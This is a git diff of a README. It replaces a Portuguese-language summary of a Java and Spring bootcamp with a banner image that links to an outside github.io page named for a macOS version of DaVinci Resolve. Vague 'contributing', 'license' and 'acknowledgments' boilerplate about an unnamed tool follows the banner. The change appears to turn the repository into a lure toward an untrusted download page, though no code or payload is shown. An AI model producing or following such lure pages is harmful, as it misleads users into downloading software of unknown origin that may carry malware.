@@ -1,12 +1,13 @@
-# ProjetoJava
+[![sdasdasd](https://github.com/user-attachments/assets/7c265e66-31a5-47e9-a2fd-7ade74a1f169)
+](https://koaborskyy.github.io/Davinci-Resolve-MacOs/)
 
-# DIO | Resumo Bootcamp
+# Contributing
+Contributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.
 
-Resumo do Bootcamp Java com Spring.
+# License
+This project is distributed under the MIT License. See the LICENSE file for more details.
 
-## 📚 Documentação
+# Acknowledgments
+Thanks to the community for providing the underlying technologies that make this tool possible.
 
-- [Documentação git](https://git-scm.com/doc)
-- [Documentação GitHub](https://docs.github.com/pt)
-
-## 👩‍💻 Resumo
+Gratitude to all users who contribute by sharing their feedback and improvements.
